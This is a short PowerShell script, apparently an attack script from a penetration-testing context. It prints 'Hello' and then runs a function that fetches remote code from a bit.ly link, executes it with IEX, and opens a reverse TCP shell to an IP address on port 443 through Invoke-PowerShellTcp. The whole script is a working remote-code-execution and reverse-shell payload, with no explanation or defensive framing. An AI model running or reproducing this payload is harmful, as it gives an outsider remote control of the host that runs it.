function RunThis(){
    $wc = New-Object System.Net.Webclient
    IEX $wc.DownloadString("https://bit.ly/1RJwIiD")
    Invoke-PowerShellTcp -Reverse -IPAddress 10.13.251.215 -Port 443
}

Write-Host "Hello"
RunThis
